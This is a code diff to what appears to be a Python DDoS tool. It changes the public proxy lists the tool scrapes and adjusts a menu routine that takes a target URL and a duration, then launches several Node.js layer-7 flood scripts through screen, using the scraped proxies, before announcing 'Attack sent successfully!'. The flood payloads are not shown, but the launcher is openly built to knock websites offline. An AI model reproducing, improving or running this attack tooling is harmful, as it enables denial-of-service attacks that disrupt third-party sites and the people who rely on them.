@@ -49,12 +49,8 @@ class Home:
 		http_proxies = [
 			"https://www.proxy-list.download/api/v1/get?type=socks4",
 		        "https://www.proxy-list.download/api/v1/get?type=socks5",
-		        "https://www.proxy-list.download/api/v1/get?type=http&anon=transparent",
-		        "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
-		        "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
-		        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
-		        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
-		        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt"]
+		        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=https",
+		        "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt"]
 		with open(file_name, 'w'):
 			for proxies in http_proxies:
 				if httpx.get(proxies).status_code == 200:
@@ -614,11 +610,11 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Murder {url} {floodtime} 15 utils/http.txt 512'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Murder {url} {floodtime} 15 utils/proxy.txt 512'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Zeus-Lord {url} {floodtime} 850 15 utils/http.txt'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/FUKU {url} {floodtime} 512 15 utils/http.txt'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/FUKU {url} {floodtime} 512 15 utils/proxy1.txt'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/proxy.txt {floodtime} 64 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
